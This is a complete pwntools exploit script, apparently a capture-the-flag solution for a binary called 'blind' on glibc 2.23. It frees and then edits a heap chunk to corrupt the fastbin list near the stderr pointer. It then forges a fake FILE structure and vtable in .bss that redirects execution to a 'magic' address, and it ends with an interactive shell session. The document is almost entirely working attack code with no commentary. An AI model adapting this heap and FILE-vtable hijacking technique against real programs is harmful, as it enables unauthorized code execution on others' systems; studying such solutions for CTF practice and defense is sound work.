from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./blind")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./blind")
else:
	pass

def add(index,content):
	p.sendafter("Choice:","1")
	p.sendafter("Index:",str(index))
	p.sendlineafter("Content:",content)
	p.recvuntil("Done!\n")

def edit(index,content):
	p.sendafter("Choice:","2")
	p.sendafter("Index:",str(index))
	p.sendlineafter("Content:",content)
	p.recvuntil("Done!\n")

def free(index):
	p.sendafter("Choice:","3")
	p.sendafter("Index:",str(index))
	p.recvuntil("Done!\n")

def debugf():
	gdb.attach(p,"b *0x400C36")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
stderr = 0x602040
magic = 0x4008E3
flag = 0x00000000fbad8000
debugf()
add(0,"a")
free(0)
edit(0,p64(stderr-3))
add(1,"a")
bss_base = 0x602060
# 0 1 2 3 4 5 == 6
payload = "b"*(0x10 + 3)
for i in range(5):
	payload += p64(bss_base + 8 * 6 + i * 0x68)
payload += p64(0x602020)
add(2,payload)
edit(0,p64(flag&0xffffffff) + p64(0x602500)*6 + p64(0x602600) + p64(0x602601))
# vtable_offset = 0xd8
# p struct _IO_jump_t*)0x6021c8)
# p *((struct _IO_FILE_plus*)0x00007f2ec40a6620)
# __xsput
edit(2,p64(0) + p64(0x6021c8))
edit(3,p64(0)*7 + p64(magic))
edit(5,p64(bss_base + 8*6))
p.interactive()
